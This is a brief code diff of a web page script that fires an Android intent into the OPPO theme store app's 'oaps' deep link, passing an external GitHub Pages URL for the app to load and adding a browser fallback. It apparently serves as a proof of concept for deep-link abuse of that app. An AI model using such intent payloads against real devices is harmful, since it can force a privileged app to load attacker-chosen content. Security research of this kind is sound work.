@@ -23,9 +23,7 @@
 
 <script>
     function triggerIntent() {
-        // هذا الرابط يجبر المتصفح على استدعاء التطبيق مباشرة عبر نظام Intent
-        var intentUrl = "intent://domore/web?url=https://yazidtokyo43.github.io/oppo-tes/#Intent;scheme=oaps;package=com.nearme.themestore;end";
-        
+        var intentUrl = "intent://domore/web?url=https://yazidtokyo43.github.io/oppo-tes/#Intent;scheme=oaps;package=com.nearme.themestore;S.browser_fallback_url=https://yazidtokyo43.github.io/oppo-tes/;end";
         window.location.href = intentUrl;
     }
 </script>
